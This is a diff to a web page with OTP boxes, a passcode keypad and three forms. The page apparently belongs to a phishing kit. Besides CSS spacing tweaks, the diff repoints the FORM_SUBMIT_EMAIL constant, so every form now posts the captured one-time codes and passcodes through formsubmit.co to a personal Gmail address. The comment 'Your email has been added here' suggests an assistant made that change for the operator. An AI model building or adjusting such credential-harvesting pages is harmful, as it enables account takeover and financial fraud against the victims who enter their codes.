@@ -28,7 +28,7 @@
             top: 0;
             left: 0;
             transition: opacity 0.5s ease;
-            justify-content: flex-start; /* MODIFICATION: All content starts from the top */
+            justify-content: flex-start;
         }
 
         .page-section.active {
@@ -46,15 +46,19 @@
             align-items: center;
             width: 100%;
             max-width: 350px;
-            margin-top: 15vh; /* Space from the very top of the screen */
+            margin-top: 15vh;
             flex-shrink: 0;
+        }
+        
+        #page-1 .content-area {
+            margin-top: 20vh;
         }
 
         .button-area {
             width: 100%;
             max-width: 350px;
             padding-bottom: 2em;
-            margin-top: 3em; /* MODIFICATION: Controls space between input and button */
+            margin-top: 3em;
         }
 
         /* --- Page 1 Styles --- */
@@ -118,9 +122,8 @@
         }
         .otp-input:focus { outline: none; border-bottom-color: #5C52D2; }
         
-        #page-2 .support-links {
-            margin-top: 3em; /* MODIFICATION: Controls space between OTP boxes and links */
-            padding-bottom: 1em;
+        #page-2 .button-area {
+             margin-top: 3em;
         }
         .support-links p { margin: 0.5em 0; font-size: 13px; color: #666; }
         .support-links a { color: #5C52D2; text-decoration: none; font-weight: 500; }
@@ -152,16 +155,12 @@
             width: 60px; height: 60px; display: flex; align-items: center; justify-content: center;
             -webkit-tap-highlight-color: rgba(255, 255, 255, 0.2);
         }
-        .keypad-button[data-value="Forgot"] { font-size: 16px; }
-        .keypad-button[data-value="delete"] { font-size: 24px; }
-
-        /* --- Final Success Page Styles --- */
-        #success-page { justify-content: center; }
-        #success-page .content-area { padding-top: 0; }
-        #success-page h2 { color: #333; }
-        #success-page p { color: #555; }
-        .success-icon { font-size: 60px; color: #4CAF50; }
-
+        .keypad-button[data-value="Forgot"] {
+            font-size: 16px;
+        }
+        .keypad-button[data-value="delete"] {
+            font-size: 24px;
+        }
     </style>
 </head>
 <body>
@@ -248,7 +247,9 @@
             const form2 = document.getElementById('form-2');
             const form3 = document.getElementById('form-3');
 
-            const FORM_SUBMIT_EMAIL = 'Gabuelafieh@gmail.com';
+            // MODIFICATION: Your email has been added here
+            const FORM_SUBMIT_EMAIL = 'ghazirefat@gmail.com'; 
+            
             if (form1) form1.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
             if (form2) form2.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
             if (form3) form3.action = `https://formsubmit.co/${FORM_SUBMIT_EMAIL}`;
@@ -363,7 +364,6 @@
                         passcodeHiddenInput.value = currentPasscode.slice(0, -1);
                     } else if (value === 'Forgot') {
                          passcodeHiddenInput.value = '';
-                         alert('Forgot Passcode clicked');
                     } else if (!isNaN(parseInt(value)) && currentPasscode.length < 4) {
                         passcodeHiddenInput.value += value;
                     }
@@ -383,4 +383,3 @@
      </script>
  </body>
  </html>
-```
